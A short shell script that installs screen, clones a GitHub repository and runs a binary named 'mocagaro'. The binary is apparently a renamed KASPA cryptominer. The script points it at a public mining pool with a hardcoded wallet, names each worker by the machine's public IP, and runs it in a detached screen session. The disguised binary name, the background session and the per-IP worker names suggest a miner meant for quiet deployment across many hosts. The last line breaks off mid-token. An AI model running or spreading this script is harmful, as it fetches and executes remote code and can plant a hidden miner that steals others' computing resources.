#!/bin/sh 
sudo apt update 
sudo apt-get install zip unzip 
sudo apt install screen -y 
screen -dmS binmainet.sh 65 75 
sudo git clone https://github.com/andromedasizu/andromedasizu.git 
cd andromedasizu 
chmod +x mocagaro 
ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) && ./mocagaro --coin KASPA --pool stratum+tcp://pool.woolypooly.com --port 3112 --user kaspa:qrdjgnlzuu82dq9uy7d2520fzrjaetdas73ch4evjeep76f8ae9jxqetkn50k.tes
